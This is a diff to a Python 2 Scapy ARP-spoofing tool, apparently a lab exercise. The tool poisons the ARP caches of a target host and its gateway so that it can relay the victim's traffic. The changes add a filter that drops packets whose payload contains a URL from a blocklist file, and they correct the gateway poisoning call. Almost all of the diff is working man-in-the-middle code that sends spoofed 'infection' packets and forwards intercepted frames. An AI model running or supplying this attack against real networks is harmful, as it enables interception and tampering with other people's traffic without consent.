@@ -15,6 +15,15 @@ gatewayMAC = ""
 
 pipeA, pipeB = Pipe()
 
+def filter_url(url):
+	return url.replace("https://", "").replace("http://", "")
+
+f=open('./mal_site.txt', 'rb')
+mal_url_list = [filter_url(url[:-1]) for url in f.readlines()]
+f.close()
+
+
+
 class bcolors:
     HEADER = '\033[95m'
     OKBLUE = '\033[94m'
@@ -88,7 +97,7 @@ def ARPrestore(signal, frame):
         print bcolors.WARNING + '[*] Send ARP Restore Packet to ['+myInfo.GetMyGateway()+']' + bcolors.ENDC
 	GatewayRestorePacket = Ether(src=myInfo.GetMyMac(), dst=gatewayMAC, type=2054)/ARP(pdst=myInfo.GetMyGateway(), hwdst=gatewayMAC,  psrc=targetIP, hwsrc=targetMAC, ptype=2048, hwtype=1,hwlen=6, plen=4, op=ARP.is_at)
 	for i in range(3):
-		sendp(VictimRestorePacket, verbose=False)
+		sendp(VictimRestorePacket,  verbose=False)
 		sendp(GatewayRestorePacket, verbose=False)
         sys.exit(0)
 
@@ -101,37 +110,42 @@ def SendInfectionARP(eth_src_mac, eth_dst_mac, arp_pdst, arp_hwdst, arp_psrc, ar
 		time.sleep(1)
 
 def RelayPacket(pkt):
-	global targetMAC, gatewayMAC
+	global targetMAC, gatewayMAC, targetIP
 
-	if IPv6 not in pkt and ARP not in pkt:         			              # no IPv6
-		cnt = 0
-		cntt = 0
-		try:
-			if IP in pkt:
-				sourceIP = pkt.sprintf("%IP.src%")
-				if sourceIP == targetIP:
-					pkt.src = myInfo.GetMyMac()
-					pkt.dst = gatewayMAC
-					frags=fragment(pkt,fragsize=1024)             # 1024 byte fragment
-					for frag in frags:
-						sendp(frag, verbose=False)
-						#if cnt > 1:
-						#	print cnt
-						#cnt += 1
-						#print frag.show()
+	#try:
+	if pkt.haslayer(IP):
+		if pkt.haslayer(UDP):
+			del pkt[UDP].chksum
+			del pkt[UDP].len
+		elif pkt.haslayer(TCP):
+			del pkt[TCP].chksum
+		del pkt.chksum
+		del pkt.len
+		
+		
+		is_mal = False
+		if pkt.haslayer(Raw):
+			for url in mal_url_list:
+				if url in pkt.getlayer(Raw).load:
+					print url, pkt.getlayer(Raw).load
+					is_mal = True
+					break
+		if not(is_mal):
+			if pkt[Ether].src == targetMAC:
+				pkt.src = myInfo.GetMyMac()
+				pkt.dst = gatewayMAC
+				frags=fragment(pkt,fragsize=1024)             # 1024 byte fragment
+				for frag in frags:
+					sendp(frag, verbose=False)
 
-				elif sourceIP == myInfo.GetMyGateway:
-					pkt.src = myInfo.GetMyMac()
-					pkt.dst = targetMAC
-					frags=fragment(pkt,fragsize=1024)             # 1024 byte fragment
-					for frag in frags:
-						sendp(frag, verbose=False)
-						#if cntt > 1:
-						#	print cntt
-						#cnt += 1
-						#print frag.show()
-		except:
-			print pkt.show()
+			elif pkt[IP].dst == targetIP and pkt.src == targetMAC:
+				pkt.src = myInfo.GetMyMac()
+				pkt.dst = targetMAC
+				frags=fragment(pkt,fragsize=1024)             # 1024 byte fragment
+				for frag in frags:
+					sendp(frag, verbose=False)
+	#except:
+	#	print pkt.show()
 
 
 def ForFowardPacketSniff():
@@ -197,7 +211,7 @@ if __name__ == "__main__":
 
 	thread.start_new_thread(SendInfectionARP, (myInfo.GetMyMac(), targetMAC, targetIP, targetMAC, myInfo.GetMyGateway(), myInfo.GetMyMac()))              			# Send to Victim, ARP Infection Packet 
 
-	thread.start_new_thread(SendInfectionARP, (myInfo.GetMyMac(), targetMAC, myInfo.GetMyGateway(), gatewayMAC, targetIP, myInfo.GetMyMac()))              			# Send to Gateway, ARP Infection Packet 
+	thread.start_new_thread(SendInfectionARP, (myInfo.GetMyMac(), gatewayMAC, myInfo.GetMyGateway(), gatewayMAC, targetIP, myInfo.GetMyMac()))              			# Send to Gateway, ARP Infection Packet 
 	time.sleep(1)
 	
 	thread.start_new_thread(ForFowardPacketSniff, ())
